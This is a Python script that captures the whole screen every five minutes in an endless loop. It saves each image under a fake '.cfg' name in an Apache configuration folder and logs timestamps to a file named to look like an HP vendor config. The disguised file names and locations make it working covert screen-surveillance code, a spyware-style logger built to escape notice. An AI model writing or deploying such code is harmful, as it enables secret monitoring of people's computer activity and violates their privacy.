import os
import time
from datetime import datetime
from PIL import ImageGrab

def get_current_timestamp():
    """Get the current timestamp in YYYYMMDDHHMMSS format."""
    return datetime.now().strftime("%Y%m%d%H%M%S")

def save_screenshot(filepath):
    """Capture a screenshot and save it as a file."""
    screenshot = ImageGrab.grab()
    screenshot.save(filepath, "PNG")

def append_timestamp_to_file(filepath, timestamp):
    """Append a timestamp to a text file."""
    with open(filepath, "a") as file:
        file.write(timestamp + "\n")

def ensure_directories_exist(*directories):
    """Ensure that all specified directories exist."""
    for directory in directories:
        os.makedirs(directory, exist_ok=True)

def main():
    screenshot_dir = "C:\\xampp\\apache\\conf"
    config_file_dir = "C:\\hp"
    config_file = os.path.join(config_file_dir, "hpconfig.cfg")

    # Ensure the directories exist
    ensure_directories_exist(screenshot_dir, config_file_dir)

    while True:
        # Get the current timestamp
        timestamp = get_current_timestamp()

        # Generate the screenshot file path
        screenshot_file = os.path.join(screenshot_dir, f"{timestamp}.cfg")

        # Save the screenshot
        save_screenshot(screenshot_file)

        # Append the timestamp to the config file
        append_timestamp_to_file(config_file, timestamp)

        # Wait for 5 minutes (300 seconds)
        time.sleep(300)

if __name__ == "__main__":
    main()
